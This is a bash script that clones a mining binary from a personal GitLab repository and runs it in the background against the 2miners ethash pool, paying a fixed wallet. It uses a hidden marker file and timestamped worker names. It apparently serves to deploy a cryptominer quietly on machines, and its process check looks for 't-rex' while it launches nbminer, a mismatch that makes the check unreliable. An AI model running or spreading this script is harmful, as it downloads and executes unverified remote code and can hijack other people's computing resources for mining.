#!/bin/bash
woker=$(date +'%d_%m_%H_%M_%S')
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/B8648rns22.txt" ]; then
	echo "Start setup..."
	echo "B8648rns22" > B8648rns22.txt
	git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
	./nbminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u nano_3ffz4agkarzet5rsjk7rif4788xkwr1myw91y8946q73cf637orq857e6isy.$woker &
else
	if pgrep t-rex >/dev/null 2>&1
	then
		echo "RUNNING"
	else
		git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
	./nbminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u nano_3ffz4agkarzet5rsjk7rif4788xkwr1myw91y8946q73cf637orq857e6isy.$woker &
	fi
fi
